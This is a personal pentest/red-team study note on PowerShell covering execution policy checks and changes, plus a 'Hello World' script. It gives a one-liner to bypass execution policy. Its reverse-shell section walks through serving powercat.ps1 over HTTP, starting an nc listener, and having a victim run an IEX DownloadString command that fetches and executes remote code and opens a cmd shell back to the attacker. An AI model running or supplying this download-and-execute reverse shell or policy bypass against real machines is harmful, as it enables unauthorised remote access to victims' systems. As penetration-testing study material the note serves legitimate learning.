---
creation date: May 2nd 2023
last modified date: May 2nd 2023
aliases: [PSH - .ps1]
tags: #📕
---

Primary Categories: [[01 - Pentest]] - [[01 - Red Team]]
Secondary Categories:  [[02 - Weaponization]]
Links: [[Living Off The Land]] - [[Windows]] - [[Object-Oriented Language]] - [[Dynamic Language Runtime]]
Search Tag: #📕  

# [[PowerShell]]  
___

## Description:  
This is an Object-oriented programming language. It is executed by the Dynamic Language Runtime (DLR) in `.net` with some exceptions for legacy uses.

---
## Checking Execution Policy
This will tell us if we can actually run PowerShell `.ps1` files on this machine.
1. Run in CMD: `Get-ExecutionPolicy`

### Changing Execution Policy
1. Run in CMD: `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned`

### Bypassing Execution Policy
1. Run in CMD: `powershell -ex bypass -File <PATH_TO_FILE>`

---
## Reverse Shell
1. Download Reverse Shell from below
2. `CD` into the Powercat file
3. Now serve the file up this time we will us a simple python server:
```bash
python -m http.server 8080
```
4. Start a listener:
```bash
nc -lvnp 1337
```
5. Now we need the victim to run the following:
```CMD
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LOCAL_IP>:8080/powercat.ps1');powercat -c <LOCAL_IP> -p 1337 -e cmd"
```
- This will tell the system to go to our webserver we started in step 3 and download the file. Then it will run **Powercat** feeding it the parameters to callback to our **NC** listener using CMD.

---
## Script Examples
### Hello World
```PowerShell
Write-Output "Hello World!"
```
- Save file with a `.ps1` extension and run it in CMD with `powershell -File <PATH_TO_FILE>`


___

## Resources:

| Hyperlink                                                    | Info                                |
| ------------------------------------------------------------ | ----------------------------------- |
| [THM Room](https://tryhackme.com/room/powershell)            | Not Started                         |
| [Reverse Shell](https://github.com/besimorhino/powercat.git) | Reverse Shell written in PowerShell |


Created Date: May 2nd 2023 (09:40 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
